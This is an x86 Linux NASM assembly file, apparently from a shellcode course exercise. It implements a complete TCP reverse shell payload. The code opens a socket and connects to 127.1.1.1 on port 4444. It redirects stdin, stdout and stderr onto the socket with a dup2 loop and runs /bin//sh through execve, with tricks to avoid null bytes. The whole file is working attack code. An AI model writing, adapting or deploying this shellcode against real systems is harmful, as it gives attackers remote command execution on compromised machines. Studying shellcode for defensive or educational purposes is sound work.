; Filename: linux_reverse_shell_tcp_x86.nasm
; Author: wfscs3
 
global _start
 
section .text
 
_start:
 
; ------------------------------
; 1 - sys_socketcall
; ------------------------------
;  int socketcall(int call,
;  unsigned long *args);
; ------------------------------
;
; eax = 0x66 (sys_socket)
; ebx = 0x1 (socket)
; ecx = pointer to args
;   arg1 = 0x0 (ipproto_ip)
;   arg2 = 0x1 (sock_stream)
;   arg3 = 0x2 (af_net)
; ------------------------------
 
push 0x66
pop eax
push 0x1
pop ebx
 
xor esi, esi
push esi
push ebx
push 0x2
 
mov ecx, esp 
 
int 0x80
 
; ---------------------------------------------
; it is necessary to save the result of above
; for later usage (sockfd) in sys_listen
; ---------------------------------------------
 
xor edi, edi
mov edi, eax
 
;
 
push 0x0101017f   ; IP: 127.1.1.1
push word 0x5c11  ; Port 4444
push word 0x0002  ; AF_INET = 2
mov ecx, esp      ; Save pointer
 
;;--------------------------------------
; 2 - sys_connect
;---------------------------------------
; int connect(int sockfd, const
; struct sockaddr *addr,
; socklen_t addrlen);
;---------------------------------------
;
; eax = 0x66 (sys_socket)
; ebx = 0x3 (sys_connect)
; ecx = pointer to args
;   arg1 = 0x10 (addrlen)
;   arg2 = pointer (sockfd)
;---------------------------------------
 
push 0x66
pop eax
push 0x3    ; sys_connect
pop ebx
push 0x10   ; addrlen (16)
push ecx    ; addr (pointer)
push edi    ; sockfd
 
mov ecx, esp
 
int 0x80
 
;-------------------------------
; 5 - sys_dup2
;-------------------------------
; int dup2(int oldfd, int newfd)
;-------------------------------
; eax = 0x3f (sys_dup2)
; ebx =
; ecx = pointer to args
;    arg1 = (oldfd)
;    arg2 = (newfd)
;-------------------------------
 
xor ecx, ecx
mov cl, 0x2    ; mov to ecx creates null byte. move to cl fucks it up
 
xchg ebx, edi
 
;----------------------------------------------------
; loop to redirect stdin(0), stdout(1) and stderr(2)
;----------------------------------------------------
 
dup2loop:
    mov al, 0x3f   ;syscall: sys_dup2
    int 0x80        ;exec sys_dup2
    dec ecx         ;decrement loop-counter
    jns dup2loop    ;mp to loop if SF
 
;-------------------------------
; 6 - sys_execve
; ------------------------------
; int execve(const char
; *filename, char *const argv[],
; char *const envp[]);
;-------------------------------
; eax = 0x0b (sys_execve)
; ebx = pointer (filename)
; ecx = 0 (argv)
; edx = 0 (envp)
;-------------------------------
 
push 0x0b
pop eax
xor edx, edx ; null
push edx
push 0x68732f2f ;"hs//"
push 0x6e69622f ;"nib/"
mov ebx, esp
xor ecx, ecx
 
int 0x80
